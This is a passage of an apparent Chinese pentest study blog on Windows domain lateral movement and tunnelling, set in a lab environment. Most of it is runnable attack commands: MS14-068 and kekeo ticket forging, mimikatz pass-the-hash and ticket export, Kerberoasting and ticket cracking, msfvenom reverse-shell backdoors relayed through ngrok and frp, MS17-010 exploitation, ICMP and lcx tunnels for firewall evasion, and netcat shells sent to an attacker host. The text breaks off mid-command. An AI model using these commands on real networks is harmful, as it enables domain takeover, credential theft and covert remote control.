/aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</span><br></pre></td></tr></table></figure><h2 id="3-12域横向移动PTT传递-ms14068-amp-kekeo-amp-本地"><a href="#3-12域横向移动PTT传递-ms14068-amp-kekeo-amp-本地" class="headerlink" title="3.12域横向移动PTT传递-ms14068&amp;kekeo&amp;本地"></a>3.12域横向移动PTT传递-ms14068&amp;kekeo&amp;本地</h2><p>总结：<br>PTT传递不需本地管理员权限，连接时主机名连接，分为：<br>基于漏洞<br>工具<br>本地票据</p><h3 id="3-12-1利用漏洞ms14068"><a href="#3-12-1利用漏洞ms14068" class="headerlink" title="3.12.1利用漏洞ms14068"></a>3.12.1利用漏洞ms14068</h3><p>ms14068—–&gt;powershell执行，能实现普通用户直接获取域控system权限<br>MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> MS14-068下载https://github.com/abatchy17/WindowsExploits/tree/master/MS14-0681.查看当前sidwhoami/user //查看当前sid 2.清空当前机器中所有凭证mimikatz <span class="comment"># kerberos::list   //查看当前机器凭证mimikatz # kerberos::purge  //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造# 或者klist //查看凭证列表klist purge //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造3.利用ms14-068生成TGT数据ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45 4.票据注入内存./mimikatz.exekerberos::ptc TGT_mary@god.org.ccacheexit 5.查看凭证列表klist //查看凭证列表 6.利用dir \192.168.3.21\c$dir \\OWA2010CN-God.god.org\c$</span></span></span><br></pre></td></tr></table></figure><h3 id="3-12-2利用工具kekeo"><a href="#3-12-2利用工具kekeo" class="headerlink" title="3.12.2利用工具kekeo"></a>3.12.2利用工具kekeo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 工具kekeo下载https://github.com/gentilkiwi/kekeo/releases1.生成票据.\kekeo <span class="string">&quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span> 2.导入票据kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi 3.查看凭证 klist 4.利用dir \192.168.3.21\c<span class="variable">$dir</span> \\OWA2010CN-God.god.org\c$</span></span><br></pre></td></tr></table></figure><h3 id="3-12-3利用本地票据-需管理权限"><a href="#3-12-3利用本地票据-需管理权限" class="headerlink" title="3.12.3利用本地票据(需管理权限)"></a>3.12.3利用本地票据(需管理权限)</h3><p>原理：<br>因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗。<br>​</p><p>条件：<br>票据是有有效期的，一般为10小时，所以如果当前主机10h之内连接过域控的话，我们可以利用该票据，但是如果超过10h，就没法利用了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.导出本地票据(需管理权限)sekurlsa::tickets /export 2.导入票据kerberos::ptt xxxxxxxxxx.xxxx.kirbi 3.查看票据klist 4.利用dir \\OWA2010CN-God.god.org\c$ dir \192.168.3.21\c$</span><br></pre></td></tr></table></figure><h2 id="3-13国产Ladon内网杀器"><a href="#3-13国产Ladon内网杀器" class="headerlink" title="3.13国产Ladon内网杀器"></a>3.13国产Ladon内网杀器</h2><p>信息收集-协议扫描-漏洞探针-传递攻击等</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 官网：http://k8gege.org/Ladon/<span class="comment"># 具体用法请查看官网wiki，举例如下Ladon.exe 192.168.1.8/24 OnlinePC 扫当前机器所处C段的存活主机，其它模块同理Ladon.exe 192.168.1.8/24 OsScan 扫当前机器所处C段操作系统版本，其它模块同理Ladon.exe 192.168.1.8/24 MysqlScan 扫当前机器所处C段的ssh端口，其它模块同理Ladon 192.168.1.8/24 MS17010 扫当前机器所处C段的永恒之蓝漏洞，其它模块同理# 参考：https://www.cnblogs.com/zpchcbd/p/11944486.html</span></span></span><br></pre></td></tr></table></figure><h2 id="3-14域横向移动RDP传递-Mimikatz"><a href="#3-14域横向移动RDP传递-Mimikatz" class="headerlink" title="3.14域横向移动RDP传递-Mimikatz"></a>3.14域横向移动RDP传递-Mimikatz</h2><p>除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作。<br>​</p><p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">RDP明文密码链接</span><br><span class="line"><span class="meta">#</span><span class="bash"> windows:</span></span><br><span class="line">mstsc.exe /console /v:192.168.3.21 /admin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> linux:</span> </span><br><span class="line">rdesktop 192.168.3.21:3389</span><br><span class="line"> </span><br><span class="line">RDP密文HASH链接</span><br><span class="line">windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，</span><br><span class="line">同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；</span><br><span class="line"> </span><br><span class="line">开启命令：</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line"> </span><br><span class="line">开启后运行：</span><br><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-15域横向移动SPN服务-探针-请求-导出-破解-重写"><a href="#3-15域横向移动SPN服务-探针-请求-导出-破解-重写" class="headerlink" title="3.15域横向移动SPN服务-探针,请求,导出,破解,重写"></a>3.15域横向移动SPN服务-探针,请求,导出,破解,重写</h2><p>kerberos中的spn详解：<br><a href="https://www.cnblogs.com/backlion/p/8082623.html">https://www.cnblogs.com/backlion/p/8082623.html</a><br>​</p><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。<br>​</p><p>SPN扫描</p><ul><li>当计算机加入域时,主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中。在安装新的服务后，SPN也会被记录在计算机账号的相应属性中。</li><li>SPN扫描也称为”扫描Kerberos服务实例名称”。在活动目录中发现服务的最佳方法就是SPN扫描。SPN扫描通过请求特定SPN类型的服务主体名称来查找服务。与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口(不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志)。因为SPN查询是Kerberos票据行为的一部分，所以检测难度很大。</li><li>由于SPN扫描是基于LDAP协议向域控制器进行查询的，所以，攻击者只需要获得一个普通的域用户权限，就可以进行SPN扫描。</li><li>在域环境中，发现服务的最好办法就是通过”SPN扫描”。通过请求特定SPN类型服务主体名称来查找服务。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1.探针</span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -q */* | findstr &quot;MSSQL&quot;</span><br><span class="line"> </span><br><span class="line">2.请求票据</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看票据</span></span><br><span class="line">klist   </span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除缓存票据</span></span><br><span class="line">klist purge</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> powershell请求</span></span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mimikatz请求</span></span><br><span class="line">mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看票据</span></span><br><span class="line">klist</span><br><span class="line"> </span><br><span class="line">3.导出票据</span><br><span class="line"><span class="meta">#</span><span class="bash"> mimikatz</span></span><br><span class="line">mimikatz.exe &quot;kerberos::list /export&quot;</span><br><span class="line"> </span><br><span class="line">4.破解票据</span><br><span class="line"><span class="meta">#</span><span class="bash"> 破解工具tgsrepcrack.py python3环境运行</span></span><br><span class="line">python tgsrepcrack.py passwd.txt xxxx.kirbi</span><br><span class="line">python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span><br><span class="line"> </span><br><span class="line">5.重写票据(可能可以提权)</span><br><span class="line"><span class="meta">#</span><span class="bash"> kerberoast下载：https://github.com/nidem/kerberoast</span></span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</span><br><span class="line"> </span><br><span class="line">6.利用</span><br><span class="line">dir //xxx.xxx.xxx.xxx/c$</span><br></pre></td></tr></table></figure><h2 id="3-16域横向移动测试流程——Cobalt-Strike"><a href="#3-16域横向移动测试流程——Cobalt-Strike" class="headerlink" title="3.16域横向移动测试流程——Cobalt Strike"></a>3.16域横向移动测试流程——Cobalt Strike</h2><p>CobaltStrike4.0用户手册：<a href="https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q">https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q</a> 提取码:dtm2<br>CS神器大概流程：启动-&gt;配置-&gt;监听-&gt;执行-&gt;上线-&gt;提权-&gt;信息收集(网络,凭证,定位等)-&gt;渗透<br>1.关于启动及配置讲解<br>2.关于提权及插件加载<br>3.关于信息收集命令讲解<br>4.关于视图自动化功能讲解</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> CobaltStrike Aggressor 脚本合集（可以自行在GitHub搜索）https://github.com/harleyQu1nn/AggressorScriptshttps://github.com/Und3rf10w/Aggressor-scriptshttps://github.com/001SPARTaN/aggressor_scriptshttps://github.com/rasta-mouse/Aggressor-Scripthttps://github.com/threatexpress/aggressor-scriptshttps://github.com/ramen0x3f/AggressorScriptshttps://github.com/FortyNorthSecurity/AggressorAssessorhttps://github.com/michalkoczwara/aggressor_scripts_collectionhttps://github.com/ars3n11/Aggressor-Scriptshttps://github.com/gaudard/scripts/tree/master/red-team/aggressorhttps://github.com/bluscreenofjeff/AggressorScriptshttps://github.com/vysecurity/Aggressor-VYSEChttps://github.com/killswitch-GUI/CobaltStrike-ToolKithttps://github.com/rsmudge/ElevateKit （第三方提权攻击）https://github.com/QAX-A-Team/CobaltStrike-Toolsethttps://github.com/DeEpinGh0st/Erebus （Erebus CobaltStrike后渗透测试插件，持续更新）https://github.com/branthale/CobaltStrikeCNAhttps://github.com/pandasec888/taowu-cobalt-strike（仓库已关闭）</span></span><br></pre></td></tr></table></figure><h1 id="4-内网漫游Socks代理技术"><a href="#4-内网漫游Socks代理技术" class="headerlink" title="4.内网漫游Socks代理技术"></a>4.内网漫游Socks代理技术</h1><p>必要基础知识点：<br>1.内外网简单知识</p><ul><li>内网ip地址是私有ip地址（10/8, 172.16/12 , 192.168/16），除此之外就是外网ip。</li></ul><p>2.内网1和内网2通信问题</p><ul><li>两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理。</li></ul><p>3.正反向协议通信连接问题</p><ul><li>正向：控制端主动去连接被控端</li><li>反向：被控端主动去连接控制端</li><li>为什么要区分正向和反向？–因为如果控制端是外网主机，被控端是内网主机，就相当于控制端有一个唯一的IP地址（比如103.12.4.11），通过这个IP地址就可以找到控制端，而在内网的被控端（比如192.168.23.36），你通过控制端主动去找是找不到的，因为这个内网IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。</li></ul><p>4.内网穿透代理隧道技术说明</p><ul><li><strong>隧道主要解决流量分析工具、流量监控工具、防火墙等相关工具的过滤问题</strong></li><li><strong>代理主要解决网络的连通性问题</strong></li></ul><p>内网渗透-横向渗透-穿透-代理相关知识点：</p><ul><li>代理技术主要解决3种问题：内网有外网，内网有过滤（防火墙），内网无外网（单纯主机服务器，无网络）</li><li>代理主要分为：正向代理和反向代理（以下案例均有涉及）</li><li>代理相关工具：nps、frp、ngrok、reGeorg、sockscap65、earthworm、proxifier、proxychains<ul><li>案例涉及工具：frp、ngrok、sockscap65、proxifier、proxychains</li><li>nps、reGeorg工具：案例未涉及，可自行学习</li><li>EarthWorm(简称EW)：已永久停止更新。</li></ul></li></ul><h2 id="4-1内网穿透Ngrok测试演示-两个内网通讯上线"><a href="#4-1内网穿透Ngrok测试演示-两个内网通讯上线" class="headerlink" title="4.1内网穿透Ngrok测试演示-两个内网通讯上线"></a>4.1内网穿透Ngrok测试演示-两个内网通讯上线</h2><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637143073293-b51ba947-cb4d-48f9-9f09-080721f1e5aa.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.注册-购买-填写-确认</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 国外地址：</span></span><br><span class="line">https://ngrok.com/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 国内地址：</span></span><br><span class="line">https://www.ngrok.cc/</span><br><span class="line">国外的比较卡慢，用国内的就行</span><br><span class="line">协议：http 本地端口：192.168.76.132:4444</span><br><span class="line"> </span><br><span class="line">2.测试：内网1执行后门-免费主机处理-内网2监听-内网2接受器</span><br><span class="line"> </span><br><span class="line">启动ngrok客户端</span><br><span class="line">./sunny clientid &lt;隧道id&gt;</span><br><span class="line"> </span><br><span class="line">在kali下生成后门（因为选择的是http协议，所以这里是reverse_http），并把后门test.exe复制到windows7</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe</span><br><span class="line"> </span><br><span class="line">配置并监听（一旦xiaodisec.free.idcfengye.com有流量，就发给本地192.168.76.132:4444）</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.76.132</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="4-2Frp自建跳板测试-两个内网通讯上线"><a href="#4-2Frp自建跳板测试-两个内网通讯上线" class="headerlink" title="4.2Frp自建跳板测试-两个内网通讯上线"></a>4.2Frp自建跳板测试-两个内网通讯上线</h2><p>FRP说明文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a><br>Frp工具：<br>开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。而Ngrok工具使用的是别人的服务器，容易泄露隐私数据。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）# FRP下载地址https://github.com/fatedier/frp/releases服务器修改配置文件frps.ini：[common]bind_port = 6677# 可配置后台仪表盘，仪表盘的用户名和密码都是可选的# dashboard_port = 7500 # dashboard_user =admin# dashboard_pwd =admin启动服务端：./frps -c ./frps.ini 2.控制端-下载-解压-修改-启动控制端修改配置文件frpc.ini：[common]server_addr = 你的云主机ipserver_port = 6677 #frpc工作端口，必须和上面frps保持一致[msf]type = tcplocal_ip = 127.0.0.1local_port = 5555 #转发给本机的5555remote_port = 6000 #服务端用6000端口转发给本机 启动客户端(kali)：./frpc -c ./frpc.ini 生成后门：msfvenom -p windows/meterpreter/reverse_tcp lhost=你的公网ip lport=6000 -f exe -o frp.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 127.0.0.1set LPORT 5555exploit 3.靶机运行frp即可</span><br></pre></td></tr></table></figure><h2 id="4-3CFS三层内网漫游"><a href="#4-3CFS三层内网漫游" class="headerlink" title="4.3CFS三层内网漫游"></a>4.3CFS三层内网漫游</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Target1（centos7 x64）：探针目标-利用WEB漏洞(TP5_RCE)-获取webshell权限-获取Flag-Target2 1.生成后门：msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.76.132 LPORT=1111 -f elf &gt;t1.elf 2.接受反弹：msfconsoleuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.76.132set LPORT 1111exploit 3.信息收集及配置访问获取网络接口：run get_local_subnets查看路由地址：run autoroute -p添加路由地址：run autoroute -s 192.168.22.0/24开启本地代理：use auxiliary/server/socks4aset srvport 2222set version 4a exploit 4.利用本地代理接口访问测试设置浏览器代理进行访问测试linux：配置proxychains（代理工具）后调用工具探针Target2/etc/proxychains.confsocks4 192.168.76.132 2222（在配置文件中添加）proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80 -Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。-sT：扫描TCP数据包已建立的连接connect windows：利用代理工具Proxifier或SocksCap64载入代理进行进程访问测试 Target2（ubuntu x64）：探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-Target3http://192.168.22.128/index.php?r=vul&amp;keyword=1 #sql注入http://192.168.22.128/index.php?r=admini/public/login #后台http://192.168.22.128/index.php?r=special #后门shell 1.生成正向后门：msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf 2.访问接受：use exploit/multi/handlerset payload linux/x64/meterpreter/bind_tcpset rhost 192.168.22.128set LPORT 3333exploit 3.信息收集及配置访问获取网络接口：run get_local_subnets查看路由地址：run autoroute -p添加路由地址：run autoroute -s 192.168.33.0/24 Target3:（windows7 x64）探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GGproxychains4 nmap -Pn -sT 192.168.33.33use exploit/windows/smb/ms17_010_psexecset payload windows/meterpreter/bind_tcpset RHOST 192.168.33.33exploitshelldir /S flag.txt /Btype xxxxx.txt</span><br></pre></td></tr></table></figure><h1 id="5-网络-传输-应用层隧道技术"><a href="#5-网络-传输-应用层隧道技术" class="headerlink" title="5.网络/传输/应用层隧道技术"></a>5.网络/传输/应用层隧道技术</h1><p>必备知识点：<br>1.代理和隧道技术区别?</p><ul><li>代理只是为了解决网络通信问题，有些内网访问不到，可以用代理实现</li><li>隧道不仅是解决网络的通信问题，更大的作用是绕过过滤，突破防火墙/入侵检测系统。</li></ul><p>2.隧道技术为了解决什么?</p><ul><li>防火墙过滤问题、网络连接通信问题、数据回链封装问题</li><li>在数据通信被拦截的情况下，可以利用隧道技术封装改变通信协议进行绕过拦截。比如CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等问题，都可以通过隧道技术解决。</li></ul><p>3.隧道技术前期的必备条件？</p><ul><li>在用隧道之前要先探测对应隧道协议是否支持，如果不支持，用这个隧道也没有任何意义！</li></ul><p>隧道原理</p><ul><li>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</li></ul><p>常用的隧道技术有以下三种：</p><ul><li>网络层：IPv6 隧道、ICMP 隧道</li><li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li><li>应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道</li></ul><h2 id="5-1网络-传输-应用层连通性检测"><a href="#5-1网络-传输-应用层连通性检测" class="headerlink" title="5.1网络/传输/应用层连通性检测"></a>5.1网络/传输/应用层连通性检测</h2><p>隧道有各种层面的，每个层面又分不同协议，你想要用哪个隧道，就需要先确定目标主机是否支持对应隧道协议。比如你想用一个网络层的 ICMP 隧道，这个时候你要去检测目标主机支不支持ICMP隧道的开启。怎么检测呢？可以使用ping命令去ping地址，看能不能正常通信，如果能的话就可以。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.TCP 协议用“瑞士军刀”——netcat执行 nc 命令：nc &lt;IP&gt; &lt;端口&gt; 2.HTTP 协议用“curl”工具，执行curl &lt;IP地址:端口&gt;命令。如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息 3.ICMP 协议用“ping”命令，执行ping &lt;IP地址/域名&gt; 4.DNS 协议检测DNS连通性常用的命令是“nslookup”和“dig”nslookup 是windows自带的DNS探测命令dig是linux系统自带的DNS探测命令</span><br></pre></td></tr></table></figure><h2 id="5-2网络层ICMP隧道Pingtunnel"><a href="#5-2网络层ICMP隧道Pingtunnel" class="headerlink" title="5.2网络层ICMP隧道Pingtunnel"></a>5.2网络层ICMP隧道Pingtunnel</h2><p>Pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。为什么要转换？因为tcp、udp、sock5这几个协议受到防火墙和工具的拦截，这个工具就是把这些流量伪装成icmp进行数据传输！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网上介绍的大部分都是老牌工具，ptunnel工具几年前就没有更新了，不推荐使用。推荐pingtunnel，这个是一直在升级更新的一个工具。老版本介绍：https://github.com/f1vefour/ptunnel(需自行编译)新版本介绍：https://github.com/esrrhs/pingtunnel(二次开发版) 语法-p ##表示连接icmp隧道另一端的机器IP（即目标服务器）-lp ##表示需要监听的本地tcp端口-da ##指定需要转发的机器的IP（即目标内网某一机器的内网IP）-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）-x ##设置连接的密码</span><br></pre></td></tr></table></figure><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637203272138-88c5be8d-60c5-4bc5-81ce-f34b707a0293.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.ICMP隧道检测 # Webserver检测DCWebserver：ping 192.168.33.332.在webserver上开启隧道，设置密码为xiaodiWebserver：./ptunnel -x xiaodi3.在kali上执行以下命令，将webserver作为跳板，转发目标主机3389请求数据给本地1080端口Hacker xiaodi：./ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodiHacker xiaodi：rdesktop 127.0.0.1 1080</span><br></pre></td></tr></table></figure><h2 id="5-3传输层转发隧道Portmap"><a href="#5-3传输层转发隧道Portmap" class="headerlink" title="5.3传输层转发隧道Portmap"></a>5.3传输层转发隧道Portmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">隧道技术：传输层端口转发</span><br><span class="line"> </span><br><span class="line">工具：</span><br><span class="line">windows: lcx</span><br><span class="line">linux：portmap</span><br><span class="line"> </span><br><span class="line">lcx是一个端口转发工具，通过端口转发的形式，将内网服务器的某一个端口映射到公网另一台服务器的一个端口上去！</span><br><span class="line">下载：https://github.com/MrAnonymous-1/lcx</span><br><span class="line"> </span><br><span class="line">命令：</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将本地3389给攻击IP的3131</span></span><br><span class="line">DC：lcx -slave 192.168.3.31 6666 127.0.0.1 3389 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 监听6666转发至7777</span></span><br><span class="line">webserver：lcx -listen 6666 7777 </span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接webserver</span></span><br><span class="line">kali：rdesktop 192.168.76.143:7777</span><br></pre></td></tr></table></figure><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637205992563-57ed7731-8c5e-4a8d-b316-9eee2000f42c-164600289022026.png" alt="image.png"></p><h2 id="5-4传输层转发隧道Netcat"><a href="#5-4传输层转发隧道Netcat" class="headerlink" title="5.4传输层转发隧道Netcat"></a>5.4传输层转发隧道Netcat</h2><p>netcat工具是windows和linux都能利用，但是用的时候一定要确保nc是最新版，linux是自带这个命令，老版本有的不支持-e这个选项，很多功能会有限制。<br>netcat称为瑞士军刀的原因就是它利用起来非常方便，反弹会话是有很多方式的，可以利用多种协议去实现控制，因为我们在实战过程中会有很多协议被封住被拦截，所以我们要掌握很多种控制的协议，实战中就不会掉链子！<br>netcat使用的是TCP协议，所以如果受害主机没有过滤TCP协议，我们就可以尝试使用nc命令在传输层建立隧道连接实现与控制主机的通信。<br>​</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1.双向连接反弹shell</span><br><span class="line">环境：攻击主机webserver（3.31）--&gt;受害主机DC（3.21）</span><br><span class="line"> </span><br><span class="line">正向-攻击连接受害</span><br><span class="line">受害：nc -ldp 1234 -e /bin/sh                      //linux（把shell会话反弹给1234端口）</span><br><span class="line">      nc -ldp 1234 -e c:\windows\system32\cmd.exe  //windows（把cmd反弹给1234端口）</span><br><span class="line">攻击：nc 受害主机IP 1234                           //主动连接</span><br><span class="line"> </span><br><span class="line">反向-受害连接攻击</span><br><span class="line">攻击：nc -lvp 1234                         //攻击主机监听自己的1234</span><br><span class="line">受害：nc 攻击主机IP 1234 -e /bin/sh</span><br><span class="line">      nc 攻击主机IP 1234 